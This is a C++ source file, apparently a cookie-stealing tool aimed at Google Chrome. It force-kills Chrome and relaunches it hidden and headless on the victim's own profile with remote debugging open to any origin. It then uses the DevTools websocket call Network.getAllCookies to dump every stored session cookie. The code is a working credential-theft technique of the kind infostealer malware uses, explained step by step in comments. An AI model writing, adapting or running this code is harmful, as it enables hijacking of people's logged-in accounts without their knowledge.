#include <curl/curl.h>
#include "nlohmann/json.hpp"
#include <vector>
#include <iostream>
#include <ixwebsocket/IXWebSocket.h>
#include <iostream>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

//You need to install ixwebsocket via vcpkg and also json from nlohman

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output)
{
	size_t totalsize = size * nmemb;
	output->append((char*)contents, totalsize);
	return totalsize;
}

std::string GetDebugWsUrl()
{
	//Setting up and using curl to get the websocket Debugger Url
	CURL* curl = curl_easy_init();
	std::string response;
	std::string url = "http://localhost:9222/json";

	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

		CURLcode res = curl_easy_perform(curl);

		if (res == CURLE_OK)
		{
			try
			{
				auto json = nlohmann::json::parse(response);
				if (json.is_array() && !json.empty())
				{
					std::string wsUrl = json[0]["webSocketDebuggerUrl"];

					wsUrl.erase(0, wsUrl.find_first_not_of(" \t\n\r\f\v"));
					wsUrl.erase(wsUrl.find_last_not_of(" \t\n\r\f\v") + 1);
					curl_easy_cleanup(curl);
					return wsUrl;
				}
			}
			catch (const std::exception& e)
			{
				std::cerr << "JSON parse error: " << e.what() << std::endl;
			}
		}
		else
		{
			std::cerr << "curl error: " << curl_easy_strerror(res) << std::endl;
		}
		curl_easy_cleanup(curl);
	}
	return "";
}

void getallcookies()
{

	system("taskkill /F /IM chrome.exe >nul 2>&1");
	std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	//Defining some variables needed for CreateProcess
	std::string chromePath = R"(C:\Program Files\Google\Chrome\Application\chrome.exe)";

	char localAppData[MAX_PATH];
	GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
	std::string userDataDir = std::string(localAppData) + R"(\google\Chrome\User Data)";

	//Crafting the command chrome should be started with, setting the debug port etc.
	std::string cmdLine = "\"" + chromePath + "\"" +
		" --remote-debugging-port=9222" +
		" --remote-allow-origins=*" +
		" --headless" +
		" --user-data-dir=\"" + userDataDir + "\"";

	std::cout << "CMD: " << cmdLine << std::endl;

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };

	std::vector<char> cmdLineBuffer(cmdLine.begin(), cmdLine.end());
	cmdLineBuffer.push_back('\0');

	//Creating Chrome with the CREATE_NO_WINDOW flag so it creates no window, effectively it's invisible
	BOOL success = CreateProcessA(
		NULL,
		cmdLineBuffer.data(),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);

	//Checking if Chrome was started successfully
	if (success)
	{
		std::cout << "Started chrome with PID: " << pi.dwProcessId << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(5));

		DWORD exitcode;
		GetExitCodeProcess(pi.hProcess, &exitcode);



	}

	std::this_thread::sleep_for(std::chrono::seconds(2));
	std::string WsUrl = GetDebugWsUrl();
	if (WsUrl.empty())
	{
		std::cout << "No WsUrl" << std::endl;
		if (pi.hProcess) CloseHandle(pi.hProcess);
		return;
	}
	ix::WebSocket webSocket;
	webSocket.setUrl(WsUrl);

	//Here we set what should happen when a message comes in
	//Obviously we want to parse the message and extract the cookies from the result
	webSocket.setOnMessageCallback([](const ix::WebSocketMessagePtr& msg) {
		if (msg->type == ix::WebSocketMessageType::Message)
		{

			try
			{
				nlohmann::json response = nlohmann::json::parse(msg->str);


				if (response.contains("result") && response["result"].contains("cookies"))
				{
					auto cookies = response["result"]["cookies"];
					std::cout << "Cookies: " << cookies.dump() << std::endl; // dump() gibt einen String
				}
				else
				{
					std::cout << "Kein result/cookies Feld gefunden." << std::endl;
				}
			}
			catch (const nlohmann::json::parse_error& e)
			{
				std::cerr << "JSON Parse Error: " << e.what() << std::endl;
			}
		}
		});

	webSocket.start();

	//We are setting a time (0 for the beginning) and waiting for websocket to finally start, otherwise we would use a not valid websocket and couldnt connect
	int timeout = 0;
	while (webSocket.getReadyState() != ix::ReadyState::Open && timeout < 50) {
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
		timeout++;
	}
	//If the state is not Ready, that means the websocket has failed
	if (webSocket.getReadyState() != ix::ReadyState::Open) {
		std::cout << "WebSocket failed to connect to Chrome!" << std::endl;
		webSocket.stop();
		return;
	}

	//Crafting the json to send
	nlohmann::json j;
	j["id"] = 1;
	j["method"] = "Network.getAllCookies";
	webSocket.send(j.dump());
	//Sleeping for the json to come in, hopefully in 2 seconds but if not, you can set it to 5-10 seconds
	std::this_thread::sleep_for(std::chrono::seconds(2));
	webSocket.stop();

	//Closing the handles to the chrome process and thread. Important to not leak handles
	if (pi.hProcess) CloseHandle(pi.hProcess);

}

int main()
{
	getallcookies();
}